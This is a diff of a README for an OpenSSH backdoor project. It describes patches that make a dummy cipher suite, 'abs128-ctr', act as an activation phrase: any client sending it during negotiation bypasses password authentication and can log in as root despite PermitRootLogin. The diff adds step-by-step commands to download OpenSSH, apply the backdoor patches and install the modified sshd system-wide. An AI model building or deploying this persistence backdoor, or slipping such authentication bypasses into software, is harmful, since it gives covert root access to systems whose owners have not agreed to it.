@@ -11,17 +11,23 @@ Consider using this method when you want persistence, but:
 
 ## How does it work?
 
-This repo contains a patch for OpenSSH (server and client) to allow for a complete authentication bypass without modifying configuration files on the target server endpoint, adding new users, overwriting credentials, etc. The patch creates a special cipher suite, in this case `abs128-ctr`, that acts as an activation phrase for the backdoor. The OpenSSH client is modified to allow for this new cipher suite string to be sent, and the OpenSSH server, upon receiving the special cipher suite string, will bypass PASSWD authentication for the session. 
+This repo contains a patch for OpenSSH (server and client) to allow for a complete authentication bypass without modifying configuration files on the target server, adding new users, overwriting credentials, or deploying an implant such as a reverse shell. 
+
+The patch creates a dummy cipher suite, in this case `abs128-ctr` that functions as an activation phrase. Any client that sends this dummy cipher spec during the SSH [algorithm negotiation](https://datatracker.ietf.org/doc/html/rfc4253#section-7.1) will completely bypass PASSWD authentication on the patched server. Clients connecting with normal cipher specs will authenticate as normal.
+
+Additionally, the patch overrides `PermitRootLogin`, allowing clients sending the activation phrase to login as root regardless of the OpenSSH server's restriction. 
 
 ## Installation and Patching 
 
-The following commands when issued will patch OpenSSH and produce a modified ssh client in `/tmp/ssh` and a modified server in `/usr/local/sbin/sshd`. 
+The following commands when issued will patch OpenSSH and produce a modified ssh client in `/tmp/ssh` and a modified server binary in `/usr/local/sbin/sshd`. 
 
 ```
-git clone https://github.com/openssh/openssh-portable
+wget https://github.com/openssh/openssh-portable/archive/refs/tags/V_8_8_P1.tar.gz
+gunzip V_8_8_P1.tar.gz
+tar xvf V_8_8_P1.tar
 git clone https://github.com/Psmths/openssh-backdoor
-cp ./openssh-backdoor/*.patch ./openssh-portable/
-cd openssh-portable/
+cp ./openssh-backdoor/*.patch ./openssh-portable-V_8_8_P1/
+cd openssh-portable-V_8_8_P1/
 patch -u auth-passwd.c -i auth-passwd.c.patch
 patch -u auth.c -i auth.c.patch
 patch -u cipher.c -i cipher.c.patch 
@@ -31,7 +37,8 @@ patch -u packet.h -i packet.h.patch
 patch -u servconf.c -i servconf.c.patch
 autoreconf
 ./configure --bindir=/tmp/
-make -j 16
+make -j 24
+sudo make install
 ```
 
 To test, run the modified server binary and set it to listen on some port:
